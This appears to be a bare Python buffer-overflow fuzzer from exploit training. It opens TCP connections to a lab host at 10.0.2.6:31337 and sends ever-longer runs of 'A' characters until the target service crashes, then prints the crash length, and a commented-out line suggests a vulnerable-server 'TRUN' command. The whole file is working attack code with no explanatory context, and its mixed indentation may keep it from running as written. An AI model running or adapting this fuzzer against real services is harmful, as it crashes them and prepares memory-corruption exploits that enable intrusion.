#!/usr/bin/python3
import sys, socket
from time import sleep

RHOST = '10.0.2.6'
RPORT = 31337

size = 100
buffer = "A" * size
 
while True:
    try:
        # payload = "TRUN /.:/" + buffer
        # payload = buffer + "\r\n"
 	payload = buffer
 	
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST,RPORT))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + ("A" * size)
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()